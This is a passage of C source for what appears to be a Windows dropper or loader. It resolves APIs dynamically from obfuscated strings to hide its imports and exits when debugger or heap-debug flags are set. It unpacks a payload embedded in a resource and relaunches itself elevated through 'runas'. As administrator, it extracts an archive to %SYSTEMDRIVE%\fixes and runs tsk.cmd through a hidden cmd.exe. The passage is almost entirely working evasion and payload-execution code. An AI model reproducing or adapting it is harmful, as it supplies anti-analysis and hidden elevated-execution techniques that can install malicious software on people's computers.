  };
  return NULL;
};

__fdecl void free_mem(){
  if(cbuffer) LocalFree(cbuffer);
  if(frequency) LocalFree(frequency);
  if(vocbuf) LocalFree(vocbuf);
  if(valuebytes) LocalFree(valuebytes);
  if(image) LocalFree(image);
};

__fdecl void dbg(){
  DWORD NtGlobalFlag=0;
  NtGlobalFlag=*(PDWORD)((PBYTE)ppeb+0xBC);
  PINT64 pProcHeap=(PINT64)((PBYTE)ppeb+0x30);
  PUINT32 pFlags=(PUINT32)(*pProcHeap+0x70);
  PUINT32 pForceFlags=(PUINT32)(*pProcHeap+0x74);
  if((NtGlobalFlag&0x70)||(*pFlags&~HEAP_GROWABLE)||*pForceFlags){
    free_mem();
    if(iMutex) CloseHandle(iMutex);
    ExitProcess(1);
  };
  return;
};

__fdecl void init_tnumbers(){
  uint16_t i;
  char *t=(char *)tnumbers;
  for(i=0;i<300;i+=3){
    t[i]=(char)(i/30+48);
    t[i+1]=(char)((i/3)%10+48);
    t[i+2]=0;
  };
};

__fdecl void init(){
  ppeb=(PPEB)RtlGetCurrentPeb();
  get_handles();
  init_tnumbers();
  get_module_name(hntdll,o("ntdll.dll"));
  get_module_name(hkernel32,o("kernel32.dll"));
  sle=(SLE)gpa(hkernel32,o("SetLastError"));
  if(sle) sle(0);
  else ExitProcess(1);
  iMutex=CreateMutexA(NULL,true,imutex);
  if(iMutex){
    if(GetLastError()==ERROR_ALREADY_EXISTS) ExitProcess(0);
  }
  else ExitProcess(0);
  fra=(FRA)gpa(hkernel32,o("FindResourceA"));
  lrs=(LRS)gpa(hkernel32,o("LoadResource"));
  lcr=(LCR)gpa(hkernel32,o("LockResource"));
  if(fra && lrs && lcr) res=(uint8_t *)(load_res(data_res)+54);
  if(res==NULL){
    if(iMutex) CloseHandle(iMutex);
    ExitProcess(1);
  };
  read_mask=bytes2byte_raw();
  uint32_t c=0;
  bytes2uint(c);
  valuebytes=(char *)LocalAlloc(LMEM_ZEROINIT,256);
  if(!valuebytes){ free_mem(); if(iMutex) CloseHandle(iMutex); ExitProcess(1); };
  cbuffer=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,LZ_CAPACITY+1);
  if(!cbuffer){ free_mem(); if(iMutex) CloseHandle(iMutex); ExitProcess(1); };
  frequency=(uint32_t *)LocalAlloc(LMEM_ZEROINIT,257*sizeof(uint32_t));
  if(!frequency){ free_mem(); if(iMutex) CloseHandle(iMutex); ExitProcess(1); };
  vocbuf=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,0x10000);
  if(!vocbuf){ free_mem(); if(iMutex) CloseHandle(iMutex); ExitProcess(1); };
  for(uint16_t i=0;i<c;i++) valuebytes[i]=bytes2byte();
  _s(dll_u,"User32",6);
  _s(dll_s,"Shell32",7);
  _s(dll_g,"Gdi32",5);
  _s(dll_a,"Advapi32",8);
  _s(f0001,"CreateBitmap",12);
  _s(f0002,"CreateCompatibleDC",18);
  _s(f0003,"DeleteDC",8);
  _s(f0004,"DeleteObject",12);
  _s(f0005,"GetObjectA",10);
  _s(f0006,"ShellExecuteExA",15);
  _s(f0007,"FreeLibrary",11);
  _s(f0008,"BitBlt",6);
  _s(f0009,"SelectObject",12);
  _s(f0010,"CreatePen",9);
  _s(f0011,"LineTo",6);
  _s(f0012,"MoveToEx",8);
  _s(f0013,"AdjustWindowRect",16);
  _s(f0014,"BeginPaint",10);
  _s(f0015,"EndPaint",8);
  _s(f0016,"GetClientRect",13);
  _s(f0017,"GetDC",5);
  _s(f0018,"GetSystemMetrics",16);
  _s(f0019,"InvalidateRect",14);
  _s(f0020,"PtInRect",8);
  _s(f0021,"ReleaseCapture",14);
  _s(f0022,"ReleaseDC",9);
  _s(f0023,"TrackMouseEvent",15);
  _s(f0024,"UpdateWindow",12);
  _s(f0025,"LoadLibraryA",12);
  _s(f0026,"RegisterWindowMessageA",22);
  _s(f0027,"SendMessageA",12);
  _s(f0028,"CommandLineToArgvW",18);
  _s(f0029,"RtlGetVersion",13);
  _s(f0030,"LoadCursorA",11);
  _s(f0031,"WriteFile",9);
  _s(f0032,"CreateDirectoryA",16);
  _s(f0033,"GetFileAttributesA",18);
  _s(f0034,"CreateFileA",11);
  _s(f0035,"GetCommandLineW",15);
  _s(f0036,"GetEnvironmentVariableA",23);
  _s(f0037,"AllocateAndInitializeSid",24);
  _s(f0038,"CheckTokenMembership",20);
  _s(f0039,"FreeSid",7);
  _s(f0040,"GetModuleFileNameA",18);
  seed=timebits();
  flib=(FLIB)get_fn_ptr(hkernel32,f0007);
  lla=(LLA)get_fn_ptr(hkernel32,f0025);
  hgdi32=((LLA)_f(lla))(dll_g);
  huser32=((LLA)_f(lla))(dll_u);
  hshell32=((LLA)_f(lla))(dll_s);
  hadvapi32=((LLA)_f(lla))(dll_a);
  rgv=(RGV)gpa(hntdll,f0029);
  if (!iswin10()){ if(iMutex) CloseHandle(iMutex); ExitProcess(0); };
  wfe=(WFE)get_fn_ptr(hkernel32,f0031);
  cda=(CDA)get_fn_ptr(hkernel32,f0032);
  gfa=(GFA)get_fn_ptr(hkernel32,f0033);
  cfa=(CFA)get_fn_ptr(hkernel32,f0034);
  gcw=(GCW)get_fn_ptr(hkernel32,f0035);
  gev=(GEV)get_fn_ptr(hkernel32,f0036);
  gmf=(GMF)get_fn_ptr(hkernel32,f0040);
  awr=(AWR)get_fn_ptr(huser32,f0013);
  bep=(BEP)get_fn_ptr(huser32,f0014);
  epa=(EPA)get_fn_ptr(huser32,f0015);
  gcr=(GCR)get_fn_ptr(huser32,f0016);
  gdc=(GDC)get_fn_ptr(huser32,f0017);
  gsm=(GSM)get_fn_ptr(huser32,f0018);
  ivr=(IVR)get_fn_ptr(huser32,f0019);
  pir=(PIR)get_fn_ptr(huser32,f0020);
  rcp=(RCP)get_fn_ptr(huser32,f0021);
  rdc=(RDC)get_fn_ptr(huser32,f0022);
  tmv=(TMV)get_fn_ptr(huser32,f0023);
  uwi=(UWI)get_fn_ptr(huser32,f0024);
  rwma=(RWMA)get_fn_ptr(huser32,f0026);
  sma=(SMA)get_fn_ptr(huser32,f0027);
  lca=(LCA)get_fn_ptr(huser32,f0030);
  cbmp=(CBMP)get_fn_ptr(hgdi32,f0001);
  cdc=(CCDC)get_fn_ptr(hgdi32,f0002);
  ddc=(DDC)get_fn_ptr(hgdi32,f0003);
  dob=(DOB)get_fn_ptr(hgdi32,f0004);
  goa=(GOA)get_fn_ptr(hgdi32,f0005);
  blt=(BLT)get_fn_ptr(hgdi32,f0008);
  sob=(SOB)get_fn_ptr(hgdi32,f0009);
  crp=(CRP)get_fn_ptr(hgdi32,f0010);
  lto=(LTO)get_fn_ptr(hgdi32,f0011);
  mte=(MTE)get_fn_ptr(hgdi32,f0012);
  sea=(SEA)get_fn_ptr(hshell32,f0006);
  cltaw=(CLTAW)get_fn_ptr(hshell32,f0028);
  aas=(AAS)get_fn_ptr(hadvapi32,f0037);
  ctm=(CTM)get_fn_ptr(hadvapi32,f0038);
  fsd=(FSD)get_fn_ptr(hadvapi32,f0039);
};

extern "C" void start(){
  init();
  uint32_t res_size=0;
  image=(uint8_t*)LocalAlloc(LMEM_ZEROINIT,image_size);
  if(image){
    bytes2uint(res_size);
    init_unpack(res_size);
    for(uint32_t i=0;i<image_size;i++){
      if(unpack_file()) break;
      image[i]=(uint8_t)symbol;
      if(dptr==dsize) break;
    };
    int c=0;
    LPWSTR *argv=((CLTAW)_f(cltaw))(((GCW)_f(gcw))(),&c);
    if(argv){
      if(c>1){
        char *a=(char *)imutex;
        wchar_t *b=argv[1];
        while(*a && *b && (uint16_t)*a==(uint16_t)*b){
          a++;
          b++;
        };
        if(*a==0 && *b==0){
          if(is_admin()) dlg_ret=1;
          else ExitProcess(0);
        };
      };
      LocalFree(argv);
    }
    else ExitProcess(1);
    if(!dlg_ret) null_window(0);
    dbg();
    if(dlg_ret){
      _s(sea_m,"runas",5);
      _s(sea_c,"cmd.exe",7);
      SHELLEXECUTEINFO ShExecInfo;
      ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
      ShExecInfo.fMask=0;
      ShExecInfo.hwnd=NULL;
      ShExecInfo.lpDirectory=NULL;
      ShExecInfo.nShow=0;
      ShExecInfo.hInstApp=0;
      ShExecInfo.lpVerb=sea_m;
      char *path=(char *)LocalAlloc(LMEM_ZEROINIT,MAX_PATH);
      if(path){
        if(is_admin()){
          ShExecInfo.lpFile=sea_c;
          _s(drv_e,"SYSTEMDRIVE",11);
          _s(sea_o,"/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",30);
          _s(sea_r,"/c \"rd /s /q %SYSTEMDRIVE%\\fixes\"",33);
          ((GEV)_f(gev))(drv_e,path,257);
          path[strlen_i(path)+1]=0;
          path[strlen_i(path)]='/';
          res_size=0;
          bytes2uint(res_size);
          init_unpack(res_size);
          unarc(path);
          ShExecInfo.lpFile=sea_c;
          ShExecInfo.lpParameters=sea_o;
          ShExecInfo.fMask=0;
          if(((SEA)_f(sea))(&ShExecInfo)==FALSE){
            ShExecInfo.fMask=SEE_MASK_NOASYNC;
            ShExecInfo.lpVerb=NULL;
            ShExecInfo.lpParameters=sea_r;
            ((SEA)_f(sea))(&ShExecInfo);
          };
        }
        else{
          ((GMF)_f(gmf))(NULL,path,MAX_PATH);
          ShExecInfo.lpFile=path;
          ShExecInfo.lpParameters=imutex;
          if(iMutex){
            CloseHandle(iMutex);
            iMutex=0;
          };
          if(((SEA)_f(sea))(&ShExecInfo)==FALSE) res_size=0;
        };
        LocalFree(path);
      };
    };
  };
  ((FLIB)_f(flib))(hshell32);
  ((FLIB)_f(flib))(hgdi32);
  ((FLIB)_f(flib))(huser32);
  free_mem();
  if(iMutex) CloseHandle(iMutex);
  if(!res_size) ExitProcess(0);
}
